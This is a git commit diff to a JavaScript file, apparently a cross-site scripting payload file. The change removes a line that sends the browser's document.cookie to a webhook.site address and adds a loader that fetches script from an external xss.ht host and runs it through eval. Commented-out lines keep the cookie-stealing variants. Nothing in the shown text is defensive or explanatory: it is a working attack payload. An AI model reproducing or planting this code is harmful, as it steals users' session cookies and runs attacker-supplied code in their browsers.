7f8daeec77dc8e08fc3139ea09637d0d4b5078ef
HotPlugin <57496383+hotplugin0x01@users.noreply.github.com>
2022-10-27 02:26:59 +0500

    Update x.js

--- x.js
+++ x.js
@@ -1,5 +1,6 @@
 // document.location='https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?'+document.cookie;
-fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c="+document.cookie)
+function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//hailxss.xss.ht");a.send();
+// fetch("https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c="+document.cookie);
 
 
 // function xssPayload() {
